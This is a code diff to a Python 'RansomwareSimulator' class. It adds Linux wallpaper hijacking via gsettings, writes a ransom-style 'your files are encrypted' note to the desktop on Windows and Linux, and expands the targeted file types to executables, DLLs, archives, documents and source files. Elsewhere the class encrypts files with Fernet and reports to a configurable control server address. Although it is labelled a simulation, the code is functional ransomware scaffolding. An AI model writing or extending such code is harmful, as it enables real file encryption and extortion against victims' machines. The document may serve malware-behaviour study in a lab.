@@ -18,7 +18,13 @@ class RansomwareSimulator:
     def change_wallpaper(self, image_path):
         if os.name == 'nt':
             ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path , 0)
-
+        elif os.name == 'posix':
+            dest_env = os.getenv('XDG_CURRENT_DESKTOP')
+            if 'GNOME' in dest_env:
+                command = f"gsettings set org.gnome.desktop.background picture-uri file://{image_path}"
+                subprocess.run(command, shell=True)
+            else:
+                print("Wallpaper change feature is not supported on this desktop environment.")
         else:
             print("Wallpaper change feature is not supported on this OS.")
 
@@ -30,11 +36,16 @@ class RansomwareSimulator:
 
 
     def create_readme(self):
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        readme_path = os.path.join(desktop_path, 'Readme.txt')
-        with open(readme_path, 'w') as file:
-            file.write("This is a simulation program, your files are encrypted.")
-
+        if os.name == 'nt':
+            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') # salva um arquivo com informações para pagamento, na area de trabalho 
+            readme_path = os.path.join(desktop_path, 'Readme.txt')
+            with open(readme_path, 'w') as file:
+                file.write("This is a simulation program, your files are encrypted.")
+        elif os.name == 'posix':
+            desktop_path = os.path.join(os.path.join(os.environ['HOME']), 'Área de Trabalho')
+            readme_path = os.path.join(desktop_path, 'Readme.txt')
+            with open(readme_path, 'w') as file:
+                file.write("This is a simulation program, your files are encrypted.")
 
     def encrypt_file(self, file_path):
         fernet = Fernet(self.key)
@@ -93,10 +104,10 @@ class RansomwareSimulator:
         print("Memory cleared.")
 
 def main():
-    file_extensions = ['.txt', '.docx', '.jpg']
+    file_extensions = ['.txt', '.docx', '.jpg', '.exe','.csv','.pdf','.xml','.py','.xlsx','.dll','.dwg','.json','.yaml','.zip','.mkv','.mp3']
     directory = 'dosyalar/'  # 'dosyalar/' should be replaced with the directory path you want to target
-    wallpaper_path = r"duvarkağıtı/araba.jpg"
-    server_host = '10.0.2.37'
+    wallpaper_path = r"duvarkağıtı/araba.jpg" # must be replaced with the path where the image is located
+    server_host = '10.0.2.37' # should be replaced with the control server ip address
     server_port = 12345
 
     simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
